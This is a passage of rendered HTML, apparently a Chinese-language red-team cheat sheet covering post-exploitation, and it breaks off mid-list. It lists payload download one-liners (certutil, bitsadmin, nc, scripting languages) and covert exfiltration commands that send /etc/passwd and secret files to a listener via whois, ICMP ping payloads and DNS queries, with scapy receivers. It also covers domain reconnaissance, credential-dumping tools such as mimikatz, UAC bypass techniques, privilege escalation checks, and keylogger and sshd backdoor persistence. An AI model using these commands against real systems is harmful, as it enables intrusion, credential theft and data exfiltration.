class="comment">&#x27;.open.write xHttp.responseBody.savetofile &quot; C:\%homepath%\file&quot;, 2 &#x27;end with</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>執行腳本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Perl  <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> LWP::Simple;</span><br><span class="line">getstore(<span class="string">&quot;http://domain/file&quot;</span>, <span class="string">&quot;file&quot;</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>執行腳本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl test.pl</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Python  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">u = urllib2.urlopen(<span class="string">&#x27;http://domain/file&#x27;</span>)</span><br><span class="line">localFile = <span class="built_in">open</span>(<span class="string">&#x27;local_file&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">localFile.write(u.read())</span><br><span class="line">localFile.close()	</span><br></pre></td></tr></table></figure>
+<ul>
+<li>執行腳本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Ruby  <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;net/http&#x27;</span></span><br><span class="line">Net::HTTP.start(<span class="string">&quot;www.domain.com&quot;</span>) &#123; <span class="params">|http|</span>r = http.get(<span class="string">&quot;/file&quot;</span>)open(<span class="string">&quot;save_location&quot;</span>, <span class="string">&quot;wb&quot;</span>) &#123; <span class="params">|file|</span>file.write(r.body)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>執行腳本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby test.rb</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>PHP  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span>  = <span class="string">&#x27;http://www.example.com/file&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;/path/to/file&#x27;</span>;</span><br><span class="line"><span class="variable">$ch</span> = curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);curl_close(<span class="variable">$ch</span>);</span><br><span class="line">file_put_contents(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>執行腳本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php test.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>NC<ul>
+<li>Attacker  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure></li>
+<li>Target  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>FTP  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password</span><br><span class="line">get file</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></li>
+<li>TFTP  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure></li>
+<li>Bitsadmin  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure></li>
+<li>Window 文件共享  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure></li>
+<li>SCP<ul>
+<li>本地到遠端  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp file user@host.com:/tmp</span><br></pre></td></tr></table></figure></li>
+<li>遠端到本地  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp user@host.com:/tmp file</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>rsync<ul>
+<li>遠端 rsync 伺服器中複製文件到本機  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av root@192.168.78.192::www /databack</span><br></pre></td></tr></table></figure></li>
+<li>本機複製文件到遠端 rsync 伺服器  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av /databack root@192.168.78.192::www</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><code>certutil.exe</code>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://site.com/file</span><br></pre></td></tr></table></figure></li>
+<li>copy  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\IP\ShareName\file.exe file.exe</span><br></pre></td></tr></table></figure></li>
+<li>WHOIS<ul>
+<li>接收端 Host B  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 1337 | sed <span class="string">&quot;s/ //g&quot;</span> | base64 -d</span><br></pre></td></tr></table></figure></li>
+<li>發送端 Host A  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois -h host_ip -p 1337 `cat /etc/passwd | base64</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>WHOIS + TARFirst  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -k -l -p 4444 | tee files.b64</span><br><span class="line"><span class="comment">#tee to a file so you can make sure you have it</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>Next<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits</span><br></pre></td></tr></table></figure></li>
+<li>Finally<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat files.b64 | tr -d <span class="string">&#x27;\r&#x27;</span> | base64 -d | tar zxv <span class="comment">#to get the files out</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>PING<ul>
+<li>發送端  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -c 4 secret.txt | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> ping -c 1 -p <span class="variable">$line</span> ip; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></li>
+<li>接收端 (<code>ping_receiver.py</code>)  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Scapy not found, please install scapy: pip install scapy&quot;</span>)</span><br><span class="line">	sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_packet</span>(<span class="params">pkt</span>):</span></span><br><span class="line">	<span class="keyword">if</span> pkt.haslayer(ICMP):</span><br><span class="line">		<span class="keyword">if</span> pkt[ICMP].<span class="built_in">type</span> == <span class="number">8</span>:</span><br><span class="line">			data = pkt[ICMP].load[-<span class="number">4</span>:]</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;data.decode(<span class="string">&quot;utf-8&quot;</span>)&#125;</span>&#x27;</span>, flush=<span class="literal">True</span>, end=<span class="string">&quot;&quot;</span>, sep=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sniff(iface=<span class="string">&quot;eth0&quot;</span>, prn=process_packet)</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ping_receiver.py</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>DIG<ul>
+<li>發送端  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -c 31 /etc/passwd | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> dig @172.16.1.100 +short +tries=1 +time=1 <span class="variable">$line</span>.gooogle.com; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></li>
+<li>接收端 （<code>dns_receiver.py</code>)  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:    </span><br><span class="line">	<span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Scapy not found, please install scapy: pip install scapy&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_packet</span>(<span class="params">pkt</span>):</span></span><br><span class="line">	<span class="keyword">if</span> pkt.haslayer(DNS):        </span><br><span class="line">		domain = pkt[DNS][DNSQR].qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)        </span><br><span class="line">		root_domain = domain.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>]        </span><br><span class="line">		<span class="keyword">if</span> root_domain.startswith(<span class="string">&#x27;gooogle&#x27;</span>):          </span><br><span class="line">			<span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">bytearray</span>.fromhex(domain[:-<span class="number">13</span>]).decode(<span class="string">&quot;utf-8&quot;</span>)&#125;</span>&#x27;</span>, flush=<span class="literal">True</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">sniff(iface=<span class="string">&quot;eth0&quot;</span>, prn=process_packet)</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dns_receiver.py</span><br></pre></td></tr></table></figure>
+… etc.</li>
+</ul>
+</li>
+</ul>
+<h3 id="搭建-HTTP-Server"><a href="#搭建-HTTP-Server" class="headerlink" title="搭建 HTTP Server"></a><em>搭建 HTTP Server</em></h3><ul>
+<li>Python2  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1337</span><br></pre></td></tr></table></figure></li>
+<li>Python3  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 1337</span><br></pre></td></tr></table></figure></li>
+<li>PHP 5.4+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:1337</span><br></pre></td></tr></table></figure></li>
+<li>Ruby  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rwebrick -e<span class="string">&#x27;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&#x27;</span>ruby -run -e httpd . -p 1337</span><br></pre></td></tr></table></figure></li>
+<li>Perl  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MHTTP::Server::Brick -e <span class="string">&#x27;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;&#123;path=&gt;&quot;.&quot;&#125;); $s-&gt;start&#x27;</span>perl -MIO::All -e <span class="string">&#x27;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \/(.*) / &#125;)&#x27;</span></span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buxybox httpd</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox httpd -f -p 8000</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h2 id="0x03-內網情資蒐集"><a href="#0x03-內網情資蒐集" class="headerlink" title="0x03 內網情資蒐集"></a><strong><u>0x03 內網情資蒐集</u></strong></h2><h3 id="本機情資蒐集"><a href="#本機情資蒐集" class="headerlink" title="本機情資蒐集"></a><em>本機情資蒐集</em></h3><ol>
+<li>用戶列表<ul>
+<li>Windows 用戶列表：分析信箱用戶，內網 (域) 信箱用戶，通常就是內網 (域) 用戶</li>
+</ul>
+</li>
+<li>進程列表<ul>
+<li>分析防毒軟體 / 安全監控工具等，信箱客戶端、VPN、ftp 等</li>
+</ul>
+</li>
+<li>服務列表<ul>
+<li>與安全防範工作有關服務 (判斷是否可以手動開關等)</li>
+<li>存在問題的服務 (權限 / 漏洞)</li>
+</ul>
+</li>
+<li>埠列表<ul>
+<li>開放埠對應的常見服務</li>
+<li>應用程序 (匿名 / 權限 / 漏洞等) 利用埠進行情資蒐集</li>
+</ul>
+</li>
+<li>補丁列表<ul>
+<li>分析 Windows 補丁</li>
+<li>第三方軟體 (Java / Oracle / Flash 等) 漏洞</li>
+</ul>
+</li>
+<li>本機共享<ul>
+<li>本機共享列表 / 訪問權限</li>
+<li>本機訪問的域共享 / 訪問權限</li>
+</ul>
+</li>
+<li>本用戶習慣分析<ul>
+<li>歷史紀錄、收藏夾、文件等</li>
+</ul>
+</li>
+<li>獲取當前用戶密碼工具<ul>
+<li>Windows<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64">wce</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/peewpw/Invoke-WCMDump">Invoke-WCMDump</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/giMini/mimiDbg">mimiDbg</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li>
+<li><a target="_blank" rel="noopener" href="http://launcher.nirsoft.net/downloads/">nirsoft_package</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">QuarksPwDump</a></li>
+<li>星號查看器等</li>
+</ul>
+</li>
+<li>Linux<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="擴散情資蒐集"><a href="#擴散情資蒐集" class="headerlink" title="擴散情資蒐集"></a><em>擴散情資蒐集</em></h3><h4 id="端考掃描"><a href="#端考掃描" class="headerlink" title="端考掃描"></a>端考掃描</h4><ul>
+<li>常用的掃描工具<ul>
+<li><a target="_blank" rel="noopener" href="https://nmap.org/">nmap</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/robertdavidgraham/masscan">msscan</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/zmap/zmap">zmap</a></li>
+<li>s 掃描器</li>
+<li>自寫腳本</li>
+<li>NC<br>…</li>
+</ul>
+</li>
+<li>內網拓樸架構分析<ul>
+<li>DMZ</li>
+<li>管理網</li>
+<li>生產網</li>
+<li>測試網</li>
+</ul>
+</li>
+<li>常見情資蒐集指令<ul>
+<li><code>ipconfig</code>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all	<span class="comment"># 查詢本機 IP 段、所在域等</span></span><br></pre></td></tr></table></figure></li>
+<li><code>net</code>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net user									<span class="comment"># 本機用戶列表</span></span><br><span class="line">net localgroup administrators				<span class="comment"># 本機管理員 (通常含有域用戶)</span></span><br><span class="line">net user /domain							<span class="comment"># 查詢域用戶</span></span><br><span class="line">net group /domain							<span class="comment"># 查詢域裡面的工作組</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain			<span class="comment"># 查詢域管理員用戶組</span></span><br><span class="line">net localgroup administrators /domain		<span class="comment"># 登入本機的域管理員</span></span><br><span class="line">net localgroup administrators\user001 /add	<span class="comment"># 域用戶添加到本機</span></span><br><span class="line">net group <span class="string">&quot;Domain controllers&quot;</span>				<span class="comment"># 查看域控制器 (如果有多台)</span></span><br><span class="line">net view									<span class="comment"># 查詢同一域內機器列表</span></span><br><span class="line">net view /domain							<span class="comment"># 查詢域列表</span></span><br><span class="line">net view /domain:[domain name]</span><br></pre></td></tr></table></figure></li>
+<li><code>dsquery</code>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查出該域內所有機器名</span></span><br><span class="line">dsquery computer domainroot -<span class="built_in">limit</span> 65535 &amp;&amp; net group <span class="string">&quot;domaincomputers&quot;</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出該域內所有用戶名</span></span><br><span class="line">dsquery user domainroot -<span class="built_in">limit</span> 65535 &amp;&amp; net user /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出該域內網段劃分</span></span><br><span class="line">dsquery subnet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出該域內分組</span></span><br><span class="line">dsquery group &amp;&amp; net group /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出該域內組織單位</span></span><br><span class="line">dsquery ou</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出該域內域控制器</span></span><br><span class="line">dsquery server &amp;&amp; net time /domain</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>第三方情資蒐集</li>
+<li>NETBIOS 情資蒐集</li>
+<li>SMB 情資蒐集</li>
+<li>空會話 (empty session) 情資蒐集</li>
+<li>漏洞情資蒐集<br>…</li>
+</ul>
+<hr>
+<h2 id="0x04-權限提升"><a href="#0x04-權限提升" class="headerlink" title="0x04 權限提升"></a><strong><u>0x04 權限提升</u></strong></h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><em>Windows</em></h3><h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><ul>
+<li>常用方法<ul>
+<li>使用 IFileOperation COM 接口</li>
+<li>使用 Wusa.exe 的 extract 選項</li>
+<li>遠端注入 Shellcode 到傀儡進程</li>
+<li>DLL 劫持 (劫持系統的 DLL 文件)</li>
+<li>eventvwr.exe &amp; registry hijacking</li>
+<li>sdclt.exe</li>
+<li>SilentCleanup</li>
+<li>wscript.exe</li>
+<li>cmstp.exe</li>
+<li>修改環境變數，劫持高權限 .Net 程序</li>
+<li>修改註冊表 <code>HKCU\Software\Classes\CLSID</code>，劫持高權限程序</li>
+<li>直接提權過 UAC</li>
+</ul>
+</li>
+<li>常用工具<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko">Yamabiko</a></li>
+<li>…</li>
+</ul>
+</li>
+</ul>
+<h4 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h4><ul>
+<li>Windows 內核漏洞提權<ul>
+<li>檢測類 - <a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>、<a target="_blank" rel="noopener" href="https://github.com/brianwrf/WinSystemHelper">WinSystemHelper</a>、<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">wesng</a></li>
+<li>利用類 - <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">windows-kernel-exploits</a>、<a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/BeRoot">BeRoot</a></li>
+</ul>
+</li>
+<li>服務提權<ul>
+<li>資料庫服務、ftp 服務等</li>
+<li>Windows 錯誤系統配置</li>
+<li>系統服務的錯誤權限配置漏洞</li>
+<li>不安全的註冊表權限配置</li>
+<li>不安全的文件 / 目錄權限配置</li>
+<li>計劃任務</li>
+<li>任意用戶以 NT AUTHORITY\SYSTEM 權限安裝 msi</li>
+</ul>
+</li>
+<li>提權腳本<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1">PowerUP</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rsmudge/ElevateKit">ElevateKit</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><em>Linux</em></h3><h4 id="內核溢出提權"><a href="#內核溢出提權" class="headerlink" title="內核溢出提權"></a>內核溢出提權</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits</a></li>
+</ul>
+<h4 id="計畫任務"><a href="#計畫任務" class="headerlink" title="計畫任務"></a>計畫任務</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>系統服務的錯誤權限配置漏洞<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="不安全的文件-目錄權限配置"><a href="#不安全的文件-目錄權限配置" class="headerlink" title="不安全的文件 / 目錄權限配置"></a>不安全的文件 / 目錄權限配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure>
+
+<h4 id="找儲存的明文用戶名、密碼"><a href="#找儲存的明文用戶名、密碼" class="headerlink" title="找儲存的明文用戶名、密碼"></a>找儲存的明文用戶名、密碼</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 <span class="string">&quot;password&quot;</span> [filename]</span><br><span class="line">find . -name <span class="string">&quot;*.php&quot;</span> -print0 | xargs -0 grep -i -n <span class="string">&quot;var <span class="variable">$password</span>&quot;</span>	<span class="comment"># Joomla</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="0x05-權限維持"><a href="#0x05-權限維持" class="headerlink" title="0x05 權限維持"></a><strong><u>0x05 權限維持</u></strong></h2><h3 id="系統後門"><a href="#系統後門" class="headerlink" title="系統後門"></a><em>系統後門</em></h3><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><ol>
+<li>密碼記錄工具<ul>
+<li>WinlogonHack<ul>
+<li>一款用來截取遠端 3389 登陸密碼的工具，在 WinlogonHack 前有一個 Gina 木馬主要用來截取 Windows 2000 下的密碼，WinlogonHack 主要用於截取 Windows XP、Windows 2003 Server</li>
+</ul>
+</li>
+<li>鍵盤記錄器<ul>
+<li>安裝鍵盤紀錄的目的地不光是紀錄本機密碼，是紀錄管理員一切的密碼，比如說信箱、WEB 網頁密碼等等，這樣也可以得到管理員的很多情資</li>
+</ul>
+</li>
+<li>NTPass<ul>
+<li>獲取管理員密碼，一般用 gina 方式來，但有些機器上安裝了 pcanywhere 等軟體，會導致遠端登入的時候出現故障，此軟體可以實現無障礙截取口令</li>
+</ul>
+</li>
+<li>Linux 下 openssh 後門<ul>
+<li>重新編譯運行的 sshd 服務，用於紀錄用戶的登錄密碼</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>常用的儲存 Payload 位置<ul>
+<li>WMI<ul>
